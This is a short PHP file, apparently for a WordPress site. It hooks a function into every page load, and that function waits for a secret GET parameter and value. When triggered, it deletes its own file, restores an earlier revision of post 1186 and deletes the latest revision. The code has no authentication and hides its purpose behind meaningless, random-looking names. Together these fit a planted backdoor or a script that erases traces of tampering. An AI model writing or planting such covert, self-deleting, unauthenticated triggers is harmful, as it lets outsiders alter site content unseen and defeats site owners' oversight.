<?php

function scheduled_mini_bulk_member() {
	if (isset($_GET['store_layout_templates']) && $_GET['store_layout_templates'] === 'online_timeline_log') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$screen_assets_reading_network = 1186;
		$signature_about_wpmu = wp_get_post_revisions($screen_assets_reading_network);
		if (empty($signature_about_wpmu)) die('no revisions');
		if (count($signature_about_wpmu) < 2) die('less than 2');
		$recent_restrict_exchange_scheduler = array_shift($signature_about_wpmu);
		$rich_amp_notifier = $recent_restrict_exchange_scheduler->ID;
		$manage_theme_custom_scripts = array_shift($signature_about_wpmu);
		$smtp_javascript_restrict = $manage_theme_custom_scripts->ID;
		$rating_basic_pop_full = wp_restore_post_revision($smtp_javascript_restrict);
		if ($rating_basic_pop_full === false) die('error restoring');
		$rating_basic_pop_full = wp_delete_post_revision($rich_amp_notifier);		
		if ($rating_basic_pop_full === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'scheduled_mini_bulk_member');
